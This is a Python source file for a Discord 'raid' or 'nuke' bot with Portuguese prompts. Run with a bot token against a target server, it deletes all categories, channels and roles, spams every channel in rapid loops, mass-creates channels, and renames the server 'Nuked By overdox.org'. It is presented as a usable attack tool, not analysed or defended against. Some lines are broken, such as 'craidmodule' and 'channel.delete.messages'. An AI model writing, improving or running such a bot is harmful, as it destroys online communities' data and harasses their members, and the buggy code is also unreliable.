import requests
import discord
from colorama import Fore, Back, Style, init
from discord.ext import commands, tasks
from config import load_config
from modules import raidmodule
from cdn import __sdk
   
def token_load():
   raidmodule.clear_screen()

   intents = discord.Intents.default()
   intents.message_content = True
   
   bot = commands.Bot(command_prefix='#',intents=intents,help_command = None)
   
   @bot.event
   async def on_ready():
      print(Fore.MAGENTA + f'logged in as {bot.user.name}', Fore.RESET)
      print(Fore.MAGENTA + 'digite #lrd no chat', Fore.RESET)
   
   @tasks.loop(seconds=0.1)
   async def raid_spam():
       guild = bot.get_guild(load_config.Server_id)
       for chat in guild.channels:
           await chat.send(f'{load_config.message}')
           await chat.send(f'{load_config.message}')
           await chat.send(f'{load_config.message}')
           await chat.send(f'{load_config.message}')
           print(Fore.GREEN + f'Raid-Spam: 3 new messages sent on ({chat.name})',Fore.RESET)
   
   @tasks.loop(seconds=0.1)
   async def delete_all_roles():
       guild = bot.get_guild(load_config.Server_id)
       for role in guild.roles:
           try:
               await role.delete()
           except:
               pass
   
   @tasks.loop(seconds=0.1)
   async def delete_all_chats():
       guild = bot.get_guild(load_config.Server_id)
       for chat in guild.channels:
           try:
               await chat.delete()
           except:
               pass
       delete_all_chats.stop()
          
           
   @bot.command()
   async def lrd(ctx):
      while True:
         raidmodule.clear_screen()
         print(__sdk.painel)                     
   
         choose = input('prompt #>')
         
         if choose == '/full_raid':
            raidmodule.clear_screen()
            nomes = input('Insira o novo nome do server:')
            raidmodule.clear_screen()
            autor = nomes
            await ctx.guild.edit(name=f'{autor}')
            print(Fore.GREEN + f'Raid-Name: Server name changed for ({autor})',Fore.RESET)
            for category in ctx.guild.categories:
               await category.delete()
               print(Fore.RED + f'deleting category ({category.name})')
            raid_spam.start()
            delete_all_roles.start()
            for i in range(0,1000000):
                print(Fore.RED + f'Raid-Channels: creating channels (raid {autor})',Fore.RESET)
                if i == 30:
                    raidmodule.clear_screen()
                    i = 0
                try:
                    new_channel = await ctx.guild.create_text_channel(name=f'raid {autor}')
                except:
                    raidmodule.clear_screen()
                    pass
            raid_spam.stop()
            delete_all_roles.stop()
            
         elif choose == '/change_name':
            raidmodule.clear_screen()
            new_name = input('digite um novo nome >:')
            await ctx.guild.edit(name=f'{new_name}')
         
         elif choose == '/spam_chat':
            raidmodule.clear_screen()
            times = int(input('Insira a quantidade de spam:'))
            craidmodule.clear_screen()
            msg = input('Insira a msg do spam:')
            raidmodule.clear_screen()
            for i in range(0,times):
                print(Fore.RED + f'mensagem {i} enviada!', Fore.RESET)
                await ctx.send(f'{msg}')
                
         elif choose == '/nuke_chat':
            channel = ctx.channel
            channel_position = channel.position
            messages = []
            async for message in channel.history(limit=None):
               if len(messages) == 100:
                  await channel.delete_messages(messages)
               if messages:
                  await channel.delete.messages(messages)
            channel_name = channel.name
            channel_category = channel.category
            await channel.delete()
            new_channel = await ctx.guild.create_text_channel(name=channel_name, category=channel_category)
            autordosatos = ctx.author.mention
            await new_channel.edit(position=channel_position, category=channel_category, reason="nuke")
         
         elif choose == '/nuke_all':
            raidmodule.clear_screen()
            autor = ctx.author.name
            delete_all_chats.start()
            await ctx.guild.edit(name=f'Nuked By overdox.org')
            
   bot.run(f'{load_config.Token}')
     
def main_run():
    raidmodule.clear_screen()
    token_load()
    
if __name__ == '__main__':
    try:
        main_run()
    except KeyboardInterrupt:
        exit()
    except:
        pass   


